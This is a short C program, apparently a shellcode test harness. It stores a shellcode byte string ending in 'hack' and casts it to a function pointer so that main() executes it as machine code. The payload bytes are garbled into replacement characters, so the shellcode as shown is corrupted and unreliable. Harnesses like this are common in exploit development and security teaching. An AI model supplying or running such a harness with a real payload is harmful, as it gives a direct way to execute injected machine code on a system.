char shellcode[] = "�1�1�1�1ɰ�Y�̀1��1�̀�����hack";
int main(int argc, char **argv)
{
  int (*func)();
  func = (int (*)()) shellcode;
  (int)(*func)();
  return 0;
}